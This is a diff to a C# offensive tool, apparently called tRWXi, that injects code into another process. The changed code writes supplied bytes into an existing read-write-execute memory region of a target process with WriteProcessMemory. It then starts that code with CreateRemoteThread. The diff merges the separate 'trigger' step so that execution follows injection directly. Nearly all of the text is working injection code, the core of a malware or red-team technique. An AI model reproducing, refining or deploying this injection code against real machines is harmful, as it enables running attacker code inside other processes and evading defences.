@@ -135,6 +135,7 @@ namespace tRWXi
                             IntPtr written = new IntPtr();
                             ReadProcessMemory(hProcess, addr, output, size, out written);
                             Console.WriteLine(String.Format("[+] Memory [{0}] content: {1}", addr, BitConverter.ToString(output)));
+                            Environment.Exit(0);
                         }
                         else if (parameters.ContainsKey("inject"))
                         {
@@ -154,19 +155,18 @@ namespace tRWXi
                             Console.WriteLine("[!] Started injection");
                             WriteProcessMemory(hProcess, addr, data, data.Length, out numberOfBytesWritten);
                             Console.WriteLine(String.Format("[+] {0} bytes written into RWX region", numberOfBytesWritten));
-                            CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-                        }
-                        else if (parameters.ContainsKey("trigger"))
-                        {    
-                            IntPtr res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-                            Console.WriteLine("[!] Trying to execute code from provided memory");
-                            if ((int)res != 0)
-                            {
-                                Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
-                            }
-                            Environment.Exit(0);
+                            Console.WriteLine("[!] Starting execution...");
                         }
                         else {}
+
+                        Console.WriteLine("[!] Starting execution...");
+                        IntPtr res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+                        if ((int)res != 0)
+                        {
+                            Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
+                        }
+                        Environment.Exit(0);
                     }
                     else
                     {
@@ -198,6 +198,8 @@ namespace tRWXi
             catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
+                Utils.Helper.help();
+                Environment.Exit(1);
             }
         }
     }
